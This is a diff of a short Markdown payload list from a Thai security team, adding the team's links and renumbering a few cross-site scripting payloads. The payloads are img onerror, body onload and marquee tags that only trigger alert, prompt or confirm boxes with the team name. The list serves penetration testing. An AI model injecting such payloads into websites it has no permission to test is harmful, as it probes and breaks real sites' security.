@@ -1,10 +1,10 @@
 # Grim The Ripper Team by SOSECURE Thailand
+### https://medium.com/@grimthereaperteam
+### https://www.sosecure.co.th
 
 ## XSS Payloads
-`<img/&#09;&#10;&#11; src=~ onerror=prompt(1)>`
+1. `<img/&#09;&#10;&#11; src=~ onerror=prompt('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`
 
-`<BODY ONLOAD=alert('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`
+2. `<BODY ONLOAD=alert('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`
 
-`<img src=x onerror=confirm('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`
-
-`<marquee BODY ONSTART=alert('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>=(◕_◕)=`
+3. `<img src=x onerror=confirm('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`
